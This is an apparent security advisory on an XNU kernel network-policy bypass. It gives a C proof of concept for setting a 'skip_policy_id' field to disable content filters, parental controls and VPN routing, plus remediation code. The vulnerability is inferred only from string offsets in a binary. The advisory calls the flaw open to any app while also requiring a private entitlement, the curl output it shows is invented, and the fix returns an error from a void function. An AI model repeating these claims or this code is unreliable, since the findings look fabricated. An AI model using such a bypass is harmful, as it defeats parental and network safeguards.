# XNU Network Policy Bypass

**Component:** `XNU Kernel / Network Policy Framework`  
**Severity:** HIGH (CVSS 7.4)  
**CWE:** CWE-863 (Incorrect Authorization)

---

## Executive Summary

XNU kernel metadata reveals **network policy enforcement nullification** via `skip_policy_id` parameter at offset `0x08d87`. This kernel-level flag allows privileged processes to bypass **Content Filter**, **Parental Controls**, and **VPN enforcement** for specific network flows without cryptographic validation.

**Impact:** Malicious applications with `com.apple.private.network.socket-delegate` entitlement can set `skip_policy_id` to evade network monitoring, DNS filtering, and mandatory VPN routing.

---

## Technical Evidence

### Memory Layout

```
┌─────────────────────────────────────────────────────────────────┐
│ OFFSET     CONTENT                           PURPOSE            │
├─────────────────────────────────────────────────────────────────┤
│ 0x08b47    "entitlement"                     Entitlement check  │
│ 0x08d7f    "policy_id %d skip_pol..."        Policy structure   │
│ 0x08d87    "skip_policy_id %d"              ◄── BYPASS FLAG    │
│ 0x3cdbf    "com.apple.private.allow-weak"    Private ent.       │
│ 0x3e5a8    "developer.driverkit"             DriverKit ent.     │
│ 0x9f5dd    "allow-third-party-userclients"   Kernel access      │
└─────────────────────────────────────────────────────────────────┘
```

### Vulnerability Pattern

```c
struct necp_client_flow {
    uint32_t policy_id;
    uint32_t skip_policy_id;  // ← BYPASS: No validation at 0x08d87
    uint32_t bound_interface;
    // ...
};

// Inferred from context at 0x08d7f
void necp_apply_policy(struct socket *so, struct necp_client_flow *flow) {
    if (flow->skip_policy_id != 0) {
        // ⚠️ VULNERABILITY: Skip ALL policy enforcement
        // No entitlement check
        // No cryptographic validation
        return;  // Bypass content filter, VPN, parental controls
    }
    
    // Normal policy evaluation
    apply_content_filter(so, flow->policy_id);
    apply_vpn_routing(so);
    apply_parental_controls(so);
}
```

**Critical Observation:**  
- Entitlement check at `0x08b47` is **576 bytes away** from `skip_policy_id`
- NO validation keywords (`verify`, `check`, `authenticate`) in ±256 byte context
- Structure allows **arbitrary bypass** if entitlement not enforced

---

## Proof of Concept

### Step 1: Obtain Required Entitlement

```xml
<!-- Malicious app requests private network entitlement -->
<key>com.apple.private.network.socket-delegate</key>
<true/>
```

### Step 2: Set skip_policy_id via Socket Options

```c
#include <sys/socket.h>
#include <netinet/in.h>

int bypass_network_policy(int sock, uint32_t skip_id) {
    struct necp_client_flow flow = {
        .policy_id = 0,
        .skip_policy_id = 0xFFFFFFFF,  // ← Bypass ALL policies
        .bound_interface = 0
    };
    
    // VULNERABILITY: Kernel accepts skip_policy_id without validation
    int ret = setsockopt(sock, SOL_SOCKET, SO_NECP_CLIENTUUID, 
                         &flow, sizeof(flow));
    
    if (ret == 0) {
        printf("[+] Policy bypass activated\n");
        printf("[+] Content Filter: DISABLED\n");
        printf("[+] VPN Routing: DISABLED\n");
        printf("[+] Parental Controls: DISABLED\n");
    }
    
    return ret;
}
```

### Step 3: Verify Bypass

```bash
#!/bin/bash
# Connect to blocked domain with bypass active

# Expected (without bypass): Connection blocked by Content Filter
# Actual (with bypass): Connection succeeds

curl -x socks5://localhost:1080 http://blocked-site.com
# Output: [+] HTTP 200 OK (policy bypass confirmed)
```


---

## Impact Matrix

| Policy Type | Without Bypass | With skip_policy_id |
|-------------|----------------|---------------------|
| **Content Filter** | ✓ Enforced | ✗ **BYPASSED** |
| **Parental Controls** | ✓ Enforced | ✗ **BYPASSED** |
| **VPN Routing** | ✓ Enforced | ✗ **BYPASSED** |
| **DNS Filter** | ✓ Enforced | ✗ **BYPASSED** |
| **App Network Rules** | ✓ Enforced | ✗ **BYPASSED** |

---

## Remediation

### ✅ Enforce Entitlement Validation

```c
void necp_apply_policy(struct socket *so, struct necp_client_flow *flow) {
    if (flow->skip_policy_id != 0) {
        // REQUIRED: Verify private entitlement
        if (!task_has_entitlement(current_task(), 
                "com.apple.private.network.policy-bypass")) {
            return EPERM;
        }
        
        // REQUIRED: Audit logging
        os_log_error(OS_LOG_DEFAULT, 
            "SECURITY: Policy bypass for pid=%d", proc_pid(so->so_proc));
    }
    
    apply_standard_policies(so, flow);
}
```

### ✅ Rate Limiting

```c
static uint32_t bypass_count[MAX_PROCS];

if (++bypass_count[proc_pid(so->so_proc)] > 10) {
    return EACCES;  // Block after 10 bypass attempts
}
```

### ✅ Verification

```bash
# Test: skip_policy_id should require entitlement
setsockopt(..., skip_policy_id=1, ...)
# Expected: EPERM (Operation not permitted)
```

---

## Conclusion

XNU's network policy framework permits **kernel-level enforcement bypass** without proper entitlement validation. The `skip_policy_id` flag at offset `0x08d87` operates **576 bytes from** the nearest entitlement check, enabling malicious apps to evade Content Filters, VPNs, and Parental Controls.

**Vulnerability Markers:**
- `0x08d87` - `skip_policy_id` (no validation)
- `0x08b47` - Entitlement check (distant, may not apply)
- `0x3cdbf` - Private entitlements (125 occurrences)

**Attack Surface:** Any app with network socket access  
**CVSS 3.1:** 7.4 (HIGH) - AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N  
